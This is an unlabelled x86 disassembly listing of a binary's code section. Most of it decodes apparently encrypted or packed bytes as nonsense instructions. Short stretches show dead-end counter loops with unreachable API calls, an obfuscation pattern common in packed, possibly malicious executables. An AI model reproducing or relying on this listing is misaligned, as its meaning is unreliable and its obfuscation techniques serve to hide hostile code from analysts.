  401824:	inc    edi
  401825:	sbb    edi,ebx
  401827:	jb     0x4017d6
  401829:	mov    ebx,0x834d77c3
  40182e:	push   edx
  40182f:	fbstp  TBYTE PTR [eax+edi*2]
  401832:	and    cl,ah
  401834:	les    edx,FWORD PTR [esi+ebp*4+0x2a]
  401838:	mov    dl,0x20
  40183a:	mov    esi,0x18c8f2bd
  40183f:	pop    eax
  401840:	pop    ds
  401841:	sub    eax,0xa70d1786
  401846:	cmp    al,0x6e
  401848:	dec    dx
  40184a:	adc    al,0x2b
  40184c:	add    BYTE PTR [ebx-0x72eeeb75],ch
  401852:	pop    ss
  401853:	and    al,0x8f
  401855:	stc    
  401856:	add    esp,DWORD PTR [ebp+edi*1-0x6b9a95fa]
  40185d:	inc    eax
  40185e:	push   0xffffffdf
  401860:	cmp    DWORD PTR [esi+0x1],edx
  401863:	scas   eax,DWORD PTR es:[edi]
  401864:	xchg   edi,esi
  401866:	es sub al,0xd1
  401869:	mov    ah,0xd8
  40186b:	ret    0x447b
  40186e:	mov    ds:0x804a7c7,al
  401873:	nop
  401874:	adc    eax,0xbdcac5e8
  401879:	lahf   
  40187a:	(bad)  
  40187b:	scas   eax,DWORD PTR es:[edi]
  40187c:	lock mov ds:0x8404d0e3,al
  401882:	leave  
  401883:	cli    
  401884:	shr    BYTE PTR [esi],cl
  401886:	pop    edx
  401887:	cli    
  401888:	shl    DWORD PTR [ecx-0x4],0x14
  40188c:	mov    ch,0x73
  40188e:	sub    DWORD PTR [eax+0xe],esp
  401891:	xchg   BYTE PTR [eax+0xdce85b7],bh
  401897:	outs   dx,BYTE PTR ds:[esi]
  401898:	ret    
  401899:	fisttp QWORD PTR [esi+edx*8]
  40189c:	cmp    DWORD PTR [ebp+0x13d28f55],esi
  4018a2:	jbe    0x40188b
  4018a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018a5:	pop    esp
  4018a6:	sub    DWORD PTR [edi+0x3a],ebx
  4018a9:	scas   eax,DWORD PTR es:[edi]
  4018aa:	mov    ecx,0x627d9dfb
  4018af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018b0:	pusha  
  4018b1:	arpl   WORD PTR ds:0xf6c1e467,si
  4018b7:	push   es
  4018b8:	jo     0x401879
  4018ba:	add    DWORD PTR ds:0xc703977b,ebx
  4018c0:	and    DWORD PTR ds:0x433837,0x0
  4018ca:	jmp    0x4018dc
  4018cf:	mov    ebx,DWORD PTR ds:0x433837
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433837,ebx
  4018dc:	cmp    DWORD PTR ds:0x433837,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433837,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43382b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433777,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43376b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43382f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4337f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433767,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433733,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43376f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433767,0x12
  40199d:	cmp    DWORD PTR ds:0x433767,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433767,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433867
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433767,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433767
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433767,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433767
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433767,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433713,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4337f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4337eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4337eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4337eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4337eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4337eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4337eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4337eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4337eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433717,0x13
  401a7a:	cmp    DWORD PTR ds:0x433717,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433717,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433717,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433717
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433717,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433717
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433717,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433777,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433777
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433777,ecx
  401ae9:	cmp    DWORD PTR ds:0x433777,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433777,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433777,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx-0x2a]
  401b2b:	shr    BYTE PTR [eax-0x5e],1
  401b2e:	pop    esp
  401b2f:	jns    0x401baf
  401b31:	jle    0x401ba2
  401b33:	jge    0x401bb3
  401b35:	jle    0x401b86
  401b37:	popa   
  401b38:	test   DWORD PTR ds:0x7d1c9a00,0x4c658e5e
  401b42:	fistp  DWORD PTR [ebx+0x2eb625d5]
  401b48:	or     DWORD PTR [esi],esi
  401b4a:	pop    esi
  401b4b:	mov    esi,0xb8b32277
  401b50:	ins    BYTE PTR es:[edi],dx
  401b51:	loopne 0x401ae2
  401b53:	push   0x13a3bbed
  401b58:	lea    ebx,[esi-0x8]
  401b5b:	(bad)
  401b5f:	sbb    edi,esi
  401b61:	pop    ebx
  401b62:	pop    esp
  401b63:	(bad)
  401b66:	push   ds
  401b67:	push   edx
  401b68:	mov    esi,0xd991a469
  401b6d:	call   0x693f9571
  401b72:	pop    ecx
  401b73:	mov    esi,ebp
  401b75:	ja     0x401bbd
  401b77:	mov    ds:0x78d4e8e,eax
  401b7c:	mov    dl,BYTE PTR [ebx]
  401b7e:	inc    edi
  401b7f:	mov    esp,0x12837dd4
  401b84:	jno    0x401b6d
  401b86:	cli    
  401b87:	lea    ebp,[edi+ebp*1]
  401b8a:	jp     0x401b30
  401b8c:	add    BYTE PTR [eax+0x309a9d46],bl
  401b92:	or     al,0x13
  401b94:	loop   0x401b78
  401b96:	(bad)  
  401b97:	dec    ecx
  401b98:	out    dx,al
  401b99:	ss (bad) 
  401b9b:	adc    eax,0x76ea040d
  401ba0:	jno    0x401b68
  401ba2:	retf   
  401ba3:	jecxz  0x401bad
  401ba5:	xor    ebx,0xfffffff2
  401ba8:	cmp    dh,BYTE PTR [edi+eax*1-0x21]
  401bac:	sub    al,0xd8
  401bae:	or     DWORD PTR [esi-0xb96962c],ebx
  401bb4:	pop    edx
  401bb5:	xor    BYTE PTR [edi+eiz*8],ah
  401bb8:	cmc    
  401bb9:	pop    esi
  401bba:	xor    DWORD PTR [esi+eax*2+0x65],ecx
  401bbe:	pop    ds
  401bbf:	cs xchg esi,eax
  401bc1:	repnz and ecx,DWORD PTR [edx]
  401bc4:	jecxz  0x401baf
  401bc6:	mov    esi,0x40152b48
  401bcb:	clc    
  401bcc:	and    ah,BYTE PTR [ebp+edx*1-0x1a]
  401bd0:	add    esi,esi
  401bd2:	aad    0xb7
  401bd4:	sbb    BYTE PTR [ecx],dh
  401bd6:	fst    QWORD PTR [edx+0x763359c3]
  401bdc:	rol    DWORD PTR [edi-0x79],0xd2
  401be0:	cmp    ch,BYTE PTR [edx-0x2]
  401be3:	mov    DWORD PTR [ebp-0x3c21a1b7],esp
  401be9:	jecxz  0x401bcc
  401beb:	sbb    DWORD PTR ds:0x8a3ed27a,ebp
  401bf1:	dec    ecx
  401bf2:	dec    ecx
  401bf3:	sub    eax,0x36a6f812
  401bf8:	xchg   esi,eax
  401bf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bfa:	out    0x4f,al
  401bfc:	dec    ecx
  401bfd:	cmp    bl,bh
  401bff:	xor    eax,0x3a90f26b
  401c04:	outs   dx,BYTE PTR ds:[esi]
  401c05:	pop    edi
  401c06:	fwait
  401c07:	jns    0x401c6e
  401c09:	push   0x57
  401c0b:	dec    ebx
  401c0c:	add    eax,ecx
  401c0e:	mov    esi,0x4bdf3939
  401c13:	push   cs
  401c14:	mov    ds:0xc99214c8,eax
  401c19:	and    eax,0x42c97096
  401c1e:	lea    ebx,[ebp+0x3]
  401c21:	cmp    bl,BYTE PTR [edi-0x3a]
  401c24:	push   ebx
  401c25:	or     al,0x4e
  401c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c28:	popf   
  401c29:	mov    bl,0x23
  401c2b:	adc    dh,BYTE PTR [eax+0x37]
  401c2e:	dec    ebx
  401c2f:	mov    ebp,0x39ff2df0
  401c34:	loope  0x401c7e
  401c36:	mov    cl,0x85
  401c38:	adc    al,0x6
  401c3a:	cmp    edx,esp
  401c3c:	out    0x74,al
  401c3e:	mov    ch,0x9a
  401c40:	pop    eax
  401c41:	jne    0x401ca8
  401c43:	scas   al,BYTE PTR es:[edi]
  401c44:	mov    ch,0x82
  401c46:	ficomp DWORD PTR [edx-0x13]
  401c49:	add    DWORD PTR [edx-0x5f],0x12
  401c4d:	xor    ecx,ebp
  401c4f:	idiv   BYTE PTR [eax+0x1e76623e]
  401c55:	push   ds
  401c56:	jmp    0x401cb8
  401c58:	stos   BYTE PTR es:[edi],al
  401c59:	jp     0x401c0d
  401c5b:	sub    eax,0xc76d189c
  401c60:	xor    BYTE PTR [ebp+0x323cf0c9],cl
  401c66:	and    cl,BYTE PTR [ebx-0x21cdc2d]
  401c6c:	inc    esi
  401c6d:	xor    BYTE PTR [eax+0x7d1bda05],0x4d
  401c74:	mul    BYTE PTR [eax]
  401c76:	jle    0x401cb5
  401c78:	call   ecx
  401c7a:	jle    0x401ca1
  401c7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c7d:	push   edi
  401c7e:	cwde   
  401c7f:	std    
  401c80:	sub    al,0xbf
  401c82:	mov    ebp,DWORD PTR [esi-0x3b104e7f]
  401c88:	iret   
  401c89:	ficom  WORD PTR [edx+0x40]
  401c8c:	out    dx,eax
  401c8d:	xor    bl,0xa9
  401c90:	xor    edx,0x3a
  401c93:	inc    ebp
  401c94:	mov    ds:0x687cec42,al
  401c99:	ds pop es
  401c9b:	push   ss
  401c9c:	add    al,0xe9
  401c9e:	repnz pop ebx
  401ca0:	lods   al,BYTE PTR ds:[esi]
  401ca1:	xor    edi,edx
  401ca3:	inc    eax
  401ca4:	mov    esi,0xfc75606f
  401ca9:	outs   dx,DWORD PTR ds:[esi]
  401caa:	cmp    eax,0x4e0a2ad1
  401caf:	adc    al,BYTE PTR [edx+0x78]
  401cb2:	(bad)  
  401cb3:	dec    edx
  401cb4:	fstp   DWORD PTR [ebp+0x5bed63f0]
  401cba:	xchg   esp,eax
  401cbb:	xchg   BYTE PTR [esi],bl
  401cbd:	aaa    
  401cbe:	push   ss
  401cbf:	add    DWORD PTR [edx],ebx
  401cc1:	fisubr DWORD PTR [edx]
  401cc3:	add    eax,0x1fad388b
  401cc8:	mov    cl,0x6a
  401cca:	adc    BYTE PTR [ebx+0x34c8ea5a],ah
  401cd0:	jns    0x401d3b
  401cd2:	mov    ch,0x3c
  401cd4:	stc    
  401cd5:	dec    esp
  401cd6:	xlat   BYTE PTR ds:[ebx]
  401cd7:	dec    ebx
  401cd8:	pop    eax
  401cd9:	add    al,0x82
  401cdb:	pop    ss
  401cdc:	cs jmp 0x401cce
  401cdf:	lods   eax,DWORD PTR ds:[esi]
  401ce0:	mov    dl,0x48
  401ce2:	mov    ds:0x14c1da25,eax
  401ce7:	(bad)  
  401ce8:	or     ebp,DWORD PTR [ebp+0x5c]
  401ceb:	call   0xb62a:0x102a01d8
  401cf2:	adc    eax,0x2913823d
  401cf7:	add    eax,0xe73d022e
  401cfc:	mov    bl,0xbe
  401cfe:	and    al,0x32
  401d00:	push   eax
  401d01:	jp     0x401c98
  401d03:	xor    BYTE PTR [ebx],al
  401d05:	or     eax,0xbfac5a5a
  401d0a:	out    dx,eax
  401d0b:	mov    esi,DWORD PTR [esi-0x2f]
  401d0e:	jnp    0x401d0c
  401d10:	(bad)  
  401d11:	in     al,dx
  401d12:	arpl   WORD PTR [ebx+0x56e257ee],di
  401d18:	imul   edi,DWORD PTR [edi],0x42
  401d1b:	mov    edi,0x77b98873
  401d21:	inc    eax
  401d22:	rcr    BYTE PTR [ebp-0x38],cl
  401d25:	inc    esp
  401d26:	std    
  401d27:	mov    BYTE PTR [edx-0x1a72c3c7],cl
  401d2d:	inc    ebp
  401d2e:	repz xchg ecx,eax
  401d30:	jmp    0xfda5:0xe1035462
  401d37:	hlt    
  401d38:	std    
  401d39:	cmp    BYTE PTR [ebx-0x678ba5f5],0x31
  401d40:	push   ecx
  401d41:	outs   dx,BYTE PTR ds:[esi]
  401d42:	jb     0x401d23
  401d44:	(bad)  
  401d45:	into   
  401d46:	mov    ?,WORD PTR [edx]
  401d48:	mov    ah,0x2e
  401d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d4b:	scas   eax,DWORD PTR es:[edi]
  401d4c:	pusha  
  401d4d:	push   0xffffff83
  401d4f:	jmp    0xaa706d65
  401d54:	test   al,0x8d
  401d56:	adc    ebx,DWORD PTR [edx+0x284a5ee5]
  401d5c:	outs   dx,BYTE PTR ds:[esi]
  401d5d:	add    DWORD PTR [ecx],0xffffff82
  401d60:	cld    
  401d61:	pop    esi
  401d62:	iret   
  401d63:	sar    BYTE PTR ds:[ecx],1
  401d66:	fldcw  WORD PTR [esi+edi*2+0x7d]
  401d6a:	fist   WORD PTR [edx]
  401d6c:	cwde   
  401d6d:	xchg   edi,eax
  401d6e:	jae    0x401cf7
  401d70:	xchg   ecx,ebx
  401d72:	xchg   DWORD PTR [edx+0x46],esi
  401d75:	xchg   edi,eax
  401d76:	cld    
  401d77:	xor    edx,esp
  401d79:	ins    BYTE PTR es:[edi],dx
  401d7a:	jge    0x401dbc
  401d7c:	stos   DWORD PTR es:[edi],eax
  401d7d:	imul   esp,edi,0xb2d17422
  401d83:	adc    DWORD PTR [eax+0x69fb3fde],ebx
  401d89:	stc    
  401d8a:	in     eax,dx
  401d8b:	cdq    
  401d8c:	icebp  
  401d8d:	sub    ch,dh
  401d8f:	dec    eax
  401d90:	push   ss
  401d91:	fs pop ds
  401d93:	fsubr  st(4),st
  401d95:	mov    ebp,0xa38336d6
  401d9a:	mov    ds:0x2b1ec9ab,al
  401d9f:	jnp    0x401df7
  401da1:	inc    esi
  401da2:	mov    ds:0x1feb6276,al
  401da7:	addr16 ss shl dl,cl
  401dab:	in     al,0x97
  401dad:	adc    ecx,edi
  401daf:	gs jbe 0x401de1
  401db2:	inc    edx
  401db3:	jmp    0x401d7e
  401db5:	call   0x7af615fa
  401dba:	inc    eax
  401dbb:	popa   
  401dbc:	aas    
  401dbd:	stc    
  401dbe:	dec    ebx
  401dbf:	and    BYTE PTR [ebx+0x651299fa],bl
  401dc5:	xchg   BYTE PTR [ecx+ebx*1-0x2c289cc],dh
  401dcc:	fimul  WORD PTR [eax+0x6f]
  401dcf:	into   
  401dd0:	jmp    0x9ec13dfd
  401dd5:	push   edx
  401dd6:	mov    bl,0xf3
  401dd8:	pop    ds
  401dd9:	push   0x4c
  401ddb:	fidivr DWORD PTR ds:0xa7c5b310
  401de1:	fs pushf 
  401de3:	or     DWORD PTR [ebx],ecx
  401de5:	hlt    
  401de6:	cmc    
  401de7:	dec    BYTE PTR [esi-0x253d6369]
  401ded:	add    al,bl
  401def:	in     eax,dx
  401df0:	idiv   BYTE PTR [edx]
  401df2:	int3   
  401df3:	mov    ds:0x4f215426,eax
  401df8:	rcl    BYTE PTR ds:0x9f8d04ef,cl
  401dfe:	(bad)  
  401dff:	jle    0x401df9
  401e01:	and    al,0x50
  401e03:	dec    ecx
  401e04:	repz push 0x5a332fce
  401e0a:	(bad)  [ebx+0x1b]
  401e0d:	jo     0x401e4a
  401e0f:	loope  0x401e78
  401e11:	out    0x2,al
  401e13:	imul   DWORD PTR [esi+ebp*1+0x30]
  401e17:	shr    BYTE PTR ds:0xa67cf1ff,cl
  401e1d:	test   eax,0xc4aa401
  401e22:	add    DWORD PTR [edi+ecx*8-0x12],ebp
  401e26:	cld    
  401e27:	cld    
  401e28:	std    
  401e29:	lds    edi,FWORD PTR [ebx+0x3d6cb48f]
  401e2f:	adc    eax,DWORD PTR [esi]
  401e31:	add    eax,0x7df4bc78
  401e36:	leave  
  401e37:	and    ah,dh
  401e39:	pop    edi
  401e3a:	lea    edx,[esi-0x6c5a68a2]
  401e40:	and    al,0xf6
  401e42:	adc    dl,bh
  401e44:	test   bh,ah
  401e46:	ja     0x401e9d
  401e48:	push   0x239b82c2
  401e4d:	push   0x71
  401e4f:	mov    esp,0x1bf146ee
  401e54:	es call 0x2c00428
  401e5a:	scas   eax,DWORD PTR es:[edi]
  401e5b:	push   edi
  401e5c:	xchg   esi,eax
  401e5d:	jmp    0x401e8a
  401e5f:	push   edi
  401e60:	loop   0x401e7e
  401e62:	cmp    DWORD PTR ds:0xd1a8829e,0x0
  401e69:	inc    esp
  401e6a:	mov    BYTE PTR ds:0xf33617cc,cl
  401e70:	int    0x7f
  401e72:	jl     0x401eb1
  401e74:	ficom  WORD PTR [ebx-0x7b]
  401e77:	add    BYTE PTR ds:0x3303fe4,al
  401e7d:	push   ebx
  401e7e:	addr16 retf 0xc78f
  401e82:	scas   eax,DWORD PTR es:[edi]
  401e83:	jno    0x401e10
  401e85:	inc    ecx
  401e86:	jge    0x401e9d
  401e88:	xchg   edx,eax
  401e89:	cmp    ebp,0xbf18f69b
  401e8f:	bound  ebp,QWORD PTR [edx-0x21]
  401e92:	adc    bh,BYTE PTR [eax]
  401e94:	pop    eax
  401e95:	rol    BYTE PTR [esp+eiz*4-0x37063bf],0x31
  401e9d:	cmp    edx,ecx
  401e9f:	cdq    
  401ea0:	icebp  
  401ea1:	push   ebx
  401ea2:	mov    edi,0x44cfe013
  401ea7:	and    cl,dh
  401ea9:	mov    eax,ds:0x1da0bb7
  401eae:	pusha  
  401eaf:	aam    0x50
  401eb1:	jae    0x401ed2
  401eb3:	sub    BYTE PTR [ebx-0x572decb4],bh
  401eb9:	bound  esp,QWORD PTR [ecx+0x43b629ad]
  401ebf:	or     eax,0x86c7ffc9
  401ec4:	sub    al,0x53
  401ec6:	dec    ecx
  401ec7:	xor    eax,esi
  401ec9:	xchg   ebp,eax
  401eca:	mov    eax,ds:0x5f28fb3c
  401ecf:	(bad)  
  401ed0:	jge    0x401efc
  401ed2:	aam    0x6c
  401ed4:	in     eax,0xe8
  401ed6:	stc    
  401ed7:	pop    ebx
  401ed8:	or     edi,DWORD PTR [esi-0x18f7c2e6]
  401ede:	mov    bh,0xf8
  401ee0:	xor    ebp,DWORD PTR [esi-0x3154cf4d]
  401ee6:	jecxz  0x401ef1
  401ee8:	cdq    
  401ee9:	test   al,0xf9
  401eeb:	iret   
  401eec:	mov    esi,0xbe9fb605
  401ef1:	fxam   
  401ef3:	cmc    
  401ef4:	in     al,dx
  401ef5:	pop    eax
  401ef6:	mov    edx,DWORD PTR [ebp+0x2875140e]
  401efc:	mov    esi,0x59591d5c
  401f01:	push   edi
  401f02:	pop    edi
  401f03:	ins    DWORD PTR es:[edi],dx
  401f04:	push   edx
  401f05:	clc    
  401f06:	popa   
  401f07:	enter  0x7f9b,0xa4
  401f0b:	leave  
  401f0c:	stos   BYTE PTR es:[edi],al
  401f0d:	pop    ss
  401f0e:	lea    edx,[edx-0x4c819c15]
  401f14:	aam    0x74
  401f16:	test   DWORD PTR [ebx-0x3015bd93],0x51767211
  401f20:	adc    BYTE PTR ds:[esi-0x13],dh
  401f24:	dec    eax
  401f25:	int    0x99
  401f27:	add    eax,edi
  401f29:	mov    ebx,DWORD PTR ds:0x43380b
  401f2f:	mov    ecx,DWORD PTR ds:0x433857
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433847
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43371b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	xchg   ebx,eax
  401f5d:	cld    
  401f5e:	in     eax,0xbe
  401f60:	dec    ebp
  401f61:	add    eax,0x7d6f7e7e
  401f66:	jle    0x401fe6
  401f68:	push   es
  401f69:	jo     0x401ef3
  401f6b:	dec    ebp
  401f6c:	ds jbe 0x401fbe
  401f6f:	js     0x401faf
  401f71:	cmp    BYTE PTR [edi-0x4e8ce079],0x34
  401f78:	pop    eax
  401f79:	mov    cl,0xea
  401f7b:	mov    ah,0x39
  401f7d:	dec    eax
  401f7e:	fsub   DWORD PTR [edi+0x5d]
  401f81:	and    DWORD PTR [ebp+0x2327af42],edi
  401f87:	pop    esp
  401f88:	mov    eax,0x59ec4589
  401f8d:	jmp    0xd4390553
  401f92:	xor    BYTE PTR [ebx],bh
  401f94:	mov    cl,BYTE PTR [ecx+0x16]
  401f97:	add    eax,0xe616c310
  401f9c:	aad    0x85
  401f9e:	xchg   ebp,eax
  401f9f:	fwait
  401fa0:	inc    ebx
  401fa1:	or     edx,DWORD PTR [edi-0x7346b6b4]
  401fa7:	inc    ebp
  401fa8:	pop    ebx
  401fa9:	cmp    al,0xd4
  401fab:	xchg   edx,eax
  401fac:	mov    esp,0x11fcdc69
  401fb1:	ins    BYTE PTR es:[edi],dx
  401fb2:	or     BYTE PTR [ecx+0x11d808a2],bl
  401fb8:	push   esp
  401fb9:	push   ss
  401fba:	shl    DWORD PTR [edi-0x537898b1],0xe7
  401fc1:	pop    ebp
  401fc2:	inc    esi
  401fc3:	mov    DWORD PTR [eax],esi
  401fc5:	cmp    ebx,DWORD PTR [eax-0x2a51ec50]
  401fcb:	enter  0x8caa,0xcf
  401fcf:	cmp    DWORD PTR [ecx-0x76876acb],esi
  401fd5:	outs   dx,BYTE PTR ds:[esi]
  401fd6:	xchg   esp,eax
  401fd7:	lock push esi
  401fd9:	arpl   cx,bx
  401fdb:	mov    esi,0x8e2f8bea
  401fe0:	stc    
  401fe1:	push   0xad555e7f
  401fe6:	retf   0xf68f
  401fe9:	sahf   
  401fea:	sub    ah,BYTE PTR ds:0xc2cc8c7b
  401ff0:	data16 adc BYTE PTR [ebp+0x23],bl
  401ff4:	sbb    ebp,ebp
  401ff6:	add    al,0x14
  401ff8:	sbb    dl,cl
  401ffa:	sbb    bh,bh
  401ffc:	(bad)  
  401ffd:	push   ds
  401ffe:	mov    edi,0xa13a4098
  402003:	sub    ch,BYTE PTR [edi]
  402005:	pop    esi
  402006:	sub    eax,0xfa55b7f0
  40200b:	cmp    ch,BYTE PTR [ecx+0x56]
  40200e:	push   ebx
  40200f:	(bad)  
  402010:	mov    edi,0xec1f815d
  402016:	push   0x19
  402018:	daa    
  402019:	dec    ecx
  40201a:	xlat   BYTE PTR ds:[ebx]
  40201b:	pop    es
  40201c:	loope  0x40209b
  40201e:	neg    DWORD PTR [edx+ecx*4-0x75b7cdad]
  402025:	push   ds
  402026:	lds    edi,FWORD PTR [ebp-0x35]
  402029:	push   ds
  40202a:	inc    edx
  40202b:	mov    ebp,0xe31b1db9
  402030:	int3   
  402031:	add    al,0x6a
  402033:	cmp    BYTE PTR [eax+0x67b0848],dh
  402039:	cmp    DWORD PTR [eax],ebp
  40203b:	(bad)
  40203f:	shl    DWORD PTR [ecx+0x14],1
  402042:	xchg   esp,eax
  402043:	mov    ah,ch
  402045:	add    al,0x2c
  402047:	ret    0x269f
  40204a:	add    al,0xff
  40204c:	(bad)  
  40204d:	jecxz  0x402027
  40204f:	(bad)  
  402050:	adc    dl,BYTE PTR [ecx+0x9]
  402053:	dec    ebp
  402054:	ror    DWORD PTR ds:[ebx-0x53],0x9b
  402059:	sti    
  40205a:	mul    BYTE PTR [eax+0x16]
  40205d:	ret    
  40205e:	cmp    bh,BYTE PTR [ebx]
  402060:	sbb    al,0x8d
  402062:	lds    eax,FWORD PTR cs:[ebp+0x7b44da8]
  402069:	(bad)  
  40206a:	int3   
  40206b:	aas    
  40206c:	pop    esp
  40206d:	sub    al,0x1c
  40206f:	popf   
  402070:	dec    BYTE PTR [eax-0x2336bfaf]
  402076:	pop    edi
  402077:	jno    0x40200f
  402079:	cmp    ch,BYTE PTR [edi]
  40207b:	sbb    al,0x7a
  40207d:	std    
  40207e:	test   DWORD PTR [ecx-0x88c020e],0xa735f102
  402088:	loop   0x4020a0
  40208a:	xchg   ecx,eax
  40208b:	jp     0x402028
  40208d:	jbe    0x4020c9
  40208f:	xlat   BYTE PTR ds:[ebx]
  402091:	dec    ebp
  402092:	mov    edi,gs
  402094:	call   0xefc8:0xbaf5ed7d
  40209b:	push   ecx
  40209c:	sbb    edx,esi
  40209e:	ds daa 
  4020a0:	inc    edi
  4020a1:	adc    BYTE PTR [ecx-0x6ad0f802],ch
  4020a7:	xor    dl,bl
  4020a9:	fsubr  DWORD PTR [ebp+0x45372e0c]
  4020af:	aam    0xe7
  4020b1:	or     al,0x68
  4020b3:	or     BYTE PTR ds:0xbc351cfb,ch
  4020b9:	sti    
  4020ba:	stos   BYTE PTR es:[edi],al
  4020bb:	sub    DWORD PTR [ebp+0x2a],eax
  4020be:	mov    al,0x7e
  4020c0:	test   DWORD PTR [edx+0x32285209],0x7db2bfe9
  4020ca:	sbb    eax,0xe9bcf93
  4020cf:	cli    
  4020d0:	fcomp  QWORD PTR ds:0x56bdc310
  4020d7:	adc    eax,0x7c57318f
  4020dc:	sbb    BYTE PTR [edx],0x6c
  4020df:	cmp    esp,ebx
  4020e1:	ret    
  4020e2:	or     DWORD PTR fs:[esi],eax
  4020e5:	or     BYTE PTR [edi+0x44bb7f12],al
  4020eb:	inc    esp
  4020ec:	push   edi
  4020ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020ee:	mov    bh,0x79
  4020f0:	mov    ecx,0x8a6bb88c
  4020f5:	ret    
  4020f6:	imul   edi,DWORD PTR [ebp+0x6b50112a],0xffffff90
  4020fd:	int    0xaf
  4020ff:	xchg   edi,eax
  402100:	mov    esp,0x221c9182
  402105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402106:	or     BYTE PTR [ebx-0x7506079c],cl
  40210c:	ds sub al,0x23
  40210f:	aas    
  402110:	test   BYTE PTR [eax+0x13],ah
  402113:	xor    bh,BYTE PTR ss:[ebp+0x26b87a41]
